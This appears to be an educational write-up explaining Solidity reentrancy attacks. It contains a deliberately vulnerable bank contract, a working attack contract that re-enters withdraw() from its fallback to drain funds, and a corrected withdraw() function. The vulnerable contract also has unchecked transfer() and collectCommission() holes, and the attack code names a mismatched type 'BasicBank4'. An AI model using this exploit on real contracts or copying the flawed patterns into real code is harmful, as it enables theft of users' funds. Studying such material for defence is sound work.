# Reentracy Attack
## 🗺️ Overview 
The Reentrancy attack is one of the most destructive attacks in the Solidity smart contract. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.



When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract’s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.

## 💻 How Does Reentracy Attack Work?
In simple terms, a reentrancy attack occurs between two smart contracts, where an attacking smart contract exploits the code in a vulnerable contract to drain it of its funds. The exploit works by having the attacking smart contract repeatedly call the withdraw function before the vulnerable smart contract has had time to update the balance.

This is only possible because of the order in which the smart contract is set up to handle transactions, with the vulnerable smart contract first checking the balance, then sending the funds, and then finally updating its balance. The time between sending the funds and updating the balance creates a window in which the attacking smart contract can make another call to withdraw its funds, and so the cycle continues until all the funds are drained.

<img src='https://github.com/wasny0ps/Reentracy/blob/main/img/reentracy.png'>

## 🎬 Reentrancy Attack Scenario
1> The vulnerable smart contract has 10 eth.

2> An attacker stores 1 eth using the deposit function.

3> An attacker calls the withdraw function and points to a malicious contract as a recipient.

4> Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because of their deposit.

Transfer 1 eth to a malicious contract. (Note: attacker balance has NOT been updated yet)

Fallback function on received eth calls withdraw function again.

4>Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because the balance has not been updated.

Transfer 1 eth to a malicious contract and again until the attacker will drain all the funds stored on the contract.
## 📄 Example Of Vulnereable Contract
This contract is designed to provide basic web3 banking services and includes vulnerabilities that are frequently encountered in other smart contracts.
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

contract BasicBank {

    mapping (address => uint) private userFunds;
    address private commissionCollector;
    uint private collectedComission = 0;

    constructor() {
        commissionCollector = msg.sender;
    }
    
    modifier onlyCommissionCollector {
        require(msg.sender == commissionCollector);
        _;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);
        userFunds[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external payable {
        require(getBalance(msg.sender) >= _amount);
        msg.sender.call{value: _amount}("");
        userFunds[msg.sender] -= _amount;
        userFunds[commissionCollector] += _amount/100;
    }   

    function getBalance(address _user) public view returns(uint) {
        return userFunds[_user];
    }

    function getCommissionCollector() public view returns(address) {
        return commissionCollector;
    }

    function transfer(address _userToSend, uint _amount) external{
        userFunds[_userToSend] += _amount;
        userFunds[msg.sender] -= _amount;
    }

    function setCommissionCollector(address _newCommissionCollector) external onlyCommissionCollector{
        commissionCollector = _newCommissionCollector;
    }

    function collectCommission() external {
        userFunds[msg.sender] += collectedComission;
        collectedComission = 0;
    }
}
```
## 🔎 Analyze
## 🕷 A Closer Look At Attack Contract

Let's start with importing BasicBank.sol file which is in the same directory. After that, I create new BasicBank object named target and use ```constructor()``` function for which learn target contract address. Arrive second step, at least one ether must be deposited to make a transaction on the target contract.So, I had called deposit() function from target contract and withdrew it. The only thing for coffe break, we must add ```fallback()``` function. Shortly, fallback function only works when external payment comes into contract. When external payment comes into attack contract from target, call withdraw function from target again until target balance's less than 1 ether. Thus, our attack contract will have withdrew all money in bank.
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import './BasicBank.sol';

contract Attack{

    BasicBank public target;
    
    constructor(address payable _target){
        target = BasicBank4(_target);
    }
    
    function attack() external payable{
        require(msg.value >= 1e18, "At least 1 ether");
        target.deposit{value: 1e18}();
        target.withdraw(1e18);
    }
     
    fallback()external payable{
        if(address(target).balance >= 1e18){
            target.withdraw(1e18);
        }
    }
}
```
## 🕸 Attack

## 🤝  How To Prevent Reentracy Attack?

As I mentioned in the analysis part, the order of transactions in the ```withdraw()``` function is constructed with a wrong point of view. Therefore, if the transaction order is made like this way, the reentracy vulnerability will die out.

```
function withdraw(uint _amount) external payable {
        require(getBalance(msg.sender) >= _amount);
        userFunds[msg.sender] -= _amount;
        msg.sender.call{value: _amount}("");
        userFunds[commissionCollector] += _amount/100;
}
```





**_by wasny0ps_**
